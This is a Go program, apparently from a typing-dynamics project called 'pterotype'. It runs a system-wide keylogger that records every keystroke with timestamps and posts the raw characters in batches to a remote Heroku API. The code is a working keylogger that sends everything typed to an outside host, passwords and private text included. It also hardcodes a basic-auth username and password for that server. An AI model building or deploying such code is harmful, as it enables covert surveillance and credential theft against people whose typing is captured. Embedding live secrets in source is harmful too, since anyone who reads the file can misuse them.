package main

import (
	"fmt"
	"time"
	"bytes"
	"encoding/json"
	"net/http"
	"io/ioutil"

	"github.com/kindlyfire/go-keylogger"
)

const (
	delayKeyfetchUS = 1 // 1000ns = 1us = 0.001ms = 0.000001s = 1^-6s
	bucketSize = 10
)

type keypress struct {
	key rune
	timestamp time.Time
}

type keyEvent struct {
	Key1 rune `json:"key1"`
	Key2 rune `json:"key2"`
	Delay int64 `json:"delay"`
}

type Client struct {
	Username string
	Password string
}

type PostRequest struct {
	Start     string     `json:"start"`
	End       string     `json:"end"`
	Keyevents [bucketSize-1]keyEvent `json:"keyevents"`
}

func prepare(keypresses [bucketSize]keypress) [bucketSize-1]keyEvent {
	var keyEvents [bucketSize-1]keyEvent
	for i := 1; i < bucketSize; i++ {
		key1 := keypresses[i-1].key
		key2 := keypresses[i].key
		delay := keypresses[i].timestamp.UnixNano() - keypresses[i-1].timestamp.UnixNano()
		keyEvents[i-1] = keyEvent {
			Key1: key1,
			Key2: key2,
			Delay: delay,
		}
	}
	return keyEvents
}

func send(keyEvents [bucketSize-1]keyEvent, start time.Time, end time.Time) {
	fmt.Println("sending data...")
	// {
	// 	"keyevents": [{"key1": "a",
	// 		"key2": "b",
	// 		"delay": 1000000},
	// 		{"key1": "x",
	// 			"key2": "y",
	// 			"delay": 2000000},
	// 		{"key1": "x",
	// 			"key2": "y",
	// 			"delay": 2000000}],
	// 		"start": "2020-05-03T19:40:00Z",
	// 		"end": "2020-05-03T19:29:00Z"
	// }
	data := PostRequest {
		Keyevents: keyEvents,
		Start: start.Format(time.RFC3339),
		End: end.Format(time.RFC3339),
	}
	url := "https://pterotype.herokuapp.com/api/keyevents/raw"
	j, err := json.Marshal(data)
	fmt.Println(string(j))
	if err != nil {
		panic(err)
	}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(j))
	req.SetBasicAuth("bill", "227spain")
    req.Header.Set("Accept", "application/json")
    req.Header.Set("Content-Type", "application/json")
	if err != nil {
		panic(err)
	}
	client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()

    fmt.Println("response Status:", resp.Status)
    fmt.Println("response Headers:", resp.Header)
    body, _ := ioutil.ReadAll(resp.Body)
    fmt.Println("response Body:", string(body))
}

func prepareAndSend(keypresses [bucketSize]keypress) {
	keyEvents := prepare(keypresses)
	send(keyEvents, keypresses[0].timestamp, keypresses[bucketSize-1].timestamp)
}

func main() {
	kl := keylogger.NewKeylogger()
	i := 0
	var keypresses [bucketSize]keypress

	for {
		key := kl.GetKey()

		if !key.Empty {
			fmt.Printf("'%c' %d\n", key.Rune, key.Rune) // key.Keycode

			keypresses[i] = keypress {
				key: key.Rune,
				timestamp: time.Now(),
			}

			i++
		}

		if i == bucketSize {
			go prepareAndSend(keypresses)

			// Just incase, I am emptying out the array, this is probably not necessary
			// and can be removed if it is causing a performance issue. I doubt it will
			// cause performance issues.
			for j := 0; j < bucketSize; j++ {
				keypresses[j] = keypress {0, time.Now()}
			}


			i = 0
		}

		time.Sleep(delayKeyfetchUS * time.Microsecond)
	}
}
